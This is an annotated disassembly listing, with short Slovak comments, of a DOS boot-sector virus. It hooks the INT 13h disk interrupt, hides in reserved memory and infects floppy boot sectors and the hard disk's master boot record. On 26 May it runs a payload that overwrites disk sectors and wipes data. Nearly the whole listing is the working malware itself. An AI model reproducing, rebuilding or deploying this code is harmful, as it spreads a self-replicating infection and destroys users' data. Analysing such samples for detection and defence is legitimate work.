

                            ;PROGRAM NAME:      boot.com
                            ;-------------------------------------------------
00100        E9AC00         H00100: JMP    H001AF
                            ;-------------------------------------------------
00103        F500809F02030021       ;vyrobca ?            
             9D00F0    
0010E        1E                     PUSH   DS              ;SEGMENT_OPERATION
0010F P      50                     PUSH   AX
00110        0AD2                   OR     DL,DL
00112 u      751B                   JNZ    H0012F          ; . . . . . . . . .
00114 3      33C0                   XOR    AX,AX
00116        8ED8                   MOV    DS,AX           ;SEGMENT_OPERATION
00118   ?    F6063F0401             TEST   Byte Ptr [043Fh],01h ;bezi motor diskety A ?
0011D u      7510                   JNZ    H0012F          ; . . . . . . . . .
0011F X      58                     POP    AX
00120        1F                     POP    DS              ;SEGMENT_OPERATION
00121        9C                     PUSHF  
00122 .                     H00100:                        ;IRREGULAR_OFFSET
             2EFF1E0A00             CALL   Far CS:[H000Ah] ; . . . . . . . . .
00127        9C                     PUSHF  
00128        E80B00                 CALL   H00136          ; . . . . . . . . .
0012B        9D                     POPF   
0012C        CA0200                 RETF   0002h
                            ;-------------------------------------------------
0012F X      58             H0012F: POP    AX
00130        1F                     POP    DS              ;SEGMENT_OPERATION
00131 . .    2EFF2E0A00             JMP    Far CS:[H000Ah]
                            ;-------------------------------------------------
00136 P      50             H00136: PUSH   AX
00137 S      53                     PUSH   BX
00138 Q      51                     PUSH   CX
00139 R      52                     PUSH   DX
0013A        1E                     PUSH   DS              ;SEGMENT_OPERATION
0013B        06                     PUSH   ES              ;SEGMENT_OPERATION
0013C V      56                     PUSH   SI
0013D W      57                     PUSH   DI
0013E        0E                     PUSH   CS              ;SEGMENT_OPERATION
0013F        1F                     POP    DS              ;SEGMENT_OPERATION
00140        0E                     PUSH   CS              ;SEGMENT_OPERATION
00141        07                     POP    ES              ;SEGMENT_OPERATION
00142        BE0400                 MOV    SI,0004h
00145        B80102                 MOV    AX,0201h
00148        BB0002                 MOV    BX,0200h
0014B        B90100                 MOV    CX,0001h
0014E 3      33D2                   XOR    DX,DX
00150        9C                     PUSHF  
00151        FF1E0A00               CALL   Far [H000Ah]    ; . . . . . . . . .
00155 s      730C                   JNB    H00163          ; . . . . . . . . .
00157 3      33C0                   XOR    AX,AX
00159        9C                     PUSHF  
0015A        FF1E0A00               CALL   Far [H000Ah]    ; . . . . . . . . .
0015E N      4E                     DEC    SI
0015F u                     H00145:                        ;IRREGULAR_OFFSET
             75E4                   JNZ    H00145          ; . . . . . . . . .
00161  C     EB43                   JMP    Short H001A6
                            ;-------------------------------------------------
00163 3      33F6           H00163: XOR    SI,SI
00165        FC                     CLD    
00166        AD                     LODSW                  ; . . . . . . . . .
00167 ;      3B07                   CMP    AX,[BX]
00169 u      7506                   JNZ    H00171          ; . . . . . . . . .
0016B        AD                     LODSW                  ; . . . . . . . . .
0016C ;G     3B4702                 CMP    AX,[BX+02h]
0016F t5     7435                   JZ     H001A6          ; . . . . . . . . .
00171        B80103         H00171: MOV    AX,0301h
00174        B601                   MOV    DH,01h
00176        B103                   MOV    CL,03h
00178        807F15FD               CMP    Byte Ptr [BX+15h],0FDh
0017C t      7402                   JZ     H00180          ; . . . . . . . . .
0017E        B10E                   MOV    CL,0Eh
00180        890E0800       H00180: MOV    [0008h],CX
00184        9C                     PUSHF  
00185        FF1E0A00               CALL   Far [H000Ah]    ; . . . . . . . . .
00189 r      721B                   JB     H001A6          ; . . . . . . . . .
0018B        BEBE03                 MOV    SI,03BEh
0018E        BFBE01                 MOV    DI,01BEh
00191  !     B92100                 MOV    CX,0021h
00194        FC                     CLD    
00195        F3                     REPZ   
00196        A5                     MOVSW  
00197        B80103                 MOV    AX,0301h
0019A 3      33DB                   XOR    BX,BX
0019C        B90100                 MOV    CX,0001h
0019F 3      33D2                   XOR    DX,DX
001A1        9C                     PUSHF  
001A2        FF1E0A00               CALL   Far [H000Ah]    ; . . . . . . . . .
001A6 _      5F             H001A6: POP    DI
001A7 ^      5E                     POP    SI
001A8        07                     POP    ES              ;SEGMENT_OPERATION
001A9        1F                     POP    DS              ;SEGMENT_OPERATION
001AA Z      5A                     POP    DX
001AB Y      59                     POP    CX
001AC [      5B                     POP    BX
001AD X      58                     POP    AX
001AE        C3                     RET    
                            ;-------------------------------------------------
001AF 3      33C0           H001AF: XOR    AX,AX           ;nulovanie ax
001B1        8ED8                   MOV    DS,AX           ;SEGMENT_OPERATION
001B3        FA                     CLI    
001B4        8ED0                   MOV    SS,AX           ;SEGMENT_OPERATION
001B6   |    B8007C                 MOV    AX,7C00h
001B9        8BE0                   MOV    SP,AX           ;STACK_OPERATION
001BB        FB                     STI    
001BC        1E                     PUSH   DS              ;SEGMENT_OPERATION
001BD P      50                     PUSH   AX
001BE  N     A14E00                 MOV    AX,[004Eh]      ;cast adresy int14
001C1   |    A30C7C                 MOV    [7C0Ch],AX
001C4  L     A14C00                 MOV    AX,[004Ch]      ;cast adresy int13
001C7   |    A30A7C                 MOV    [7C0Ah],AX
001CA        A11304                 MOV    AX,[0413h]      ;celkom pamat 
001CD H      48                     DEC    AX              ; -1
001CE H      48                     DEC    AX              ; -1
001CF        B106                   MOV    CL,06h
001D1        A31304                 MOV    [0413h],AX      ;spat pamat-2
001D4        D3E0                   SHL    AX,CL
001D6        8EC0                   MOV    ES,AX           ;SEGMENT_OPERATION
001D8   |    A3057C                 MOV    [7C05h],AX
001DB        B80E00                 MOV    AX,000Eh
001DE   N    8C064E00               MOV    [004Eh],ES
001E2  L     A34C00                 MOV    [004Ch],AX
001E5        B9BE01                 MOV    CX,01BEh
001E8   |    BE007C                 MOV    SI,7C00h
001EB 3      33FF                   XOR    DI,DI
001ED        FC                     CLD    
001EE        F3                     REPZ   
001EF        A4                     MOVSB  
001F0 . . |  2EFF2E037C             JMP    Far CS:[H7C03h]
                            ;-------------------------------------------------
001F5 3      33C0                   XOR    AX,AX
001F7        8EC0                   MOV    ES,AX           ;SEGMENT_OPERATION
001F9        CD13                   INT    13h             ;INDEF FUNCTION
001FB        0E                     PUSH   CS              ;SEGMENT_OPERATION
001FC        1F                     POP    DS              ;SEGMENT_OPERATION
001FD        B80102                 MOV    AX,0201h
00200        8B0E0800               MOV    CX,[0008h]
00204   |    BB007C                 MOV    BX,7C00h
00207        83F907                 CMP    CX,+07h
0020A u      7507                   JNZ    H00213          ; . . . . . . . . .
0020C        BA8000                 MOV    DX,0080h
0020F        CD13                   INT    13h             ;Read FD Sectors
00211  +     EB2B                   JMP    Short H0023E
                            ;-------------------------------------------------
00213        8B0E0800       H00213: MOV    CX,[0008h]
00217        BA0001                 MOV    DX,0100h
0021A        CD13                   INT    13h             ;INDEF FUNCTION
0021C r      7220                   JB     H0023E          ; . . . . . . . . .
0021E        0E                     PUSH   CS              ;SEGMENT_OPERATION
0021F        07                     POP    ES              ;SEGMENT_OPERATION
00220        B80102                 MOV    AX,0201h
00223        BB0002                 MOV    BX,0200h
00226        B90100                 MOV    CX,0001h
00229        BA8000                 MOV    DX,0080h
0022C        CD13                   INT    13h             ;Read FD Sectors
0022E r      720E                   JB     H0023E          ; . . . . . . . . .
00230 3      33F6                   XOR    SI,SI
00232        FC                     CLD    
00233        AD                     LODSW                  ; . . . . . . . . .
00234 ;      3B07                   CMP    AX,[BX]
00236 uO     754F                   JNZ    H00287          ; . . . . . . . . .
00238        AD                     LODSW                  ; . . . . . . . . .
00239 ;G     3B4702                 CMP    AX,[BX+02h]
0023C uI     7549                   JNZ    H00287          ; . . . . . . . . .
0023E 3      33C9           H0023E: XOR    CX,CX
00240        B404                   MOV    AH,04h
00242        CD1A                   INT    1Ah             ;Date
00244   &    81FA2605               CMP    DX,0526h        ;je 26 maja?
00248 t      7401                   JZ     H0024B          ; . . . . . . . . .
0024A        CB                     RETF   
                            ;-------------------------------------------------
0024B 3      33D2           H0024B: XOR    DX,DX
0024D        B90100                 MOV    CX,0001h
00250        B80903                 MOV    AX,0309h
00253  6     8B360800               MOV    SI,[0008h]
00257        83FE03                 CMP    SI,+03h
0025A t      7410                   JZ     H0026C          ; . . . . . . . . .
0025C        B00E                   MOV    AL,0Eh
0025E        83FE0E                 CMP    SI,+0Eh
00261 t      7409                   JZ     H0026C          ; . . . . . . . . .
00263        B280                   MOV    DL,80h
00265        C606070004             MOV    Byte Ptr [0007h],04h
0026A        B011                   MOV    AL,11h
0026C   P    BB0050         H0026C: MOV    BX,5000h
0026F        8EC3                   MOV    ES,BX           ;SEGMENT_OPERATION
00271        CD13                   INT    13h             ;Write FD Sectors
00273 s      7304                   JNB    H00279          ; . . . . . . . . .
00275 2      32E4                   XOR    AH,AH
00277        CD13                   INT    13h             ;INDEF FUNCTION
00279        FEC6           H00279: INC    Byte Ptr DH
0027B :6     3A360700               CMP    DH,[0007h]
0027F r                     H00279:                        ;IRREGULAR_OFFSET
             72CF                   JB     H00250          ; . . . . . . . . .
00281 2      32F6                   XOR    DH,DH
00283        FEC5                   INC    Byte Ptr CH
00285        EBC9                   JMP    Short H00250
                            ;-------------------------------------------------
00287        B90700         H00287: MOV    CX,0007h
0028A        890E0800               MOV    [0008h],CX
0028E        B80103                 MOV    AX,0301h
00291        BA8000                 MOV    DX,0080h
00294        CD13                   INT    13h             ;Write FD Sectors
00296 r      72A6                   JB     H0023E          ; . . . . . . . . .
00298        BEBE03                 MOV    SI,03BEh
0029B        BFBE01                 MOV    DI,01BEh
0029E  !     B92100                 MOV    CX,0021h
002A1        F3                     REPZ   
002A2        A5                     MOVSW  
002A3        B80103                 MOV    AX,0301h
002A6 3      33DB                   XOR    BX,BX
002A8        FEC1                   INC    Byte Ptr CL
002AA        CD13                   INT    13h             ;Write FD Sectors
002AC        EB90                   JMP    Short H0023E
                            ;-------------------------------------------------
002AE                               DW     8   DUP(0)
002BE  Re    0A5265                 
002C1 pl     706C                   
002C3 a      61                     
002C4 c      63                     
002C5 e      65                                
002C6  an    20616E                 
002C9 d      64                                  
002CA  pr    207072                 
002CD e      65                                  
002CE ss     7373                   
002D0  an    20616E                 
002D3 y      7920                   
002D5 k      6B                     
002D6 e      65                                  
002D7 y      7920                   
002D9 wh     7768                   
002DB e      65                                  
002DC n      6E                     
002DD  re    207265
002E0 a      61       
002E1 d      64          
002E2 y      790D      
002E4        0A00           
002E6 I      49      
002E7 O      4F         
002E8        2020     
002EA        2020              
002EC        2020              
002EE S      53             
002EF Y      59        
002F0 S      53           
002F1 M      4D      
002F2 S      53            
002F3 D      44           
002F4 O      4F           
002F5 S      53         
002F6        2020        
002F8  SY    205359           
002FB S      53
002FC        0000              
002FE U      55                           ; platny boot sektor   
002FF        AA                           ;  detto 

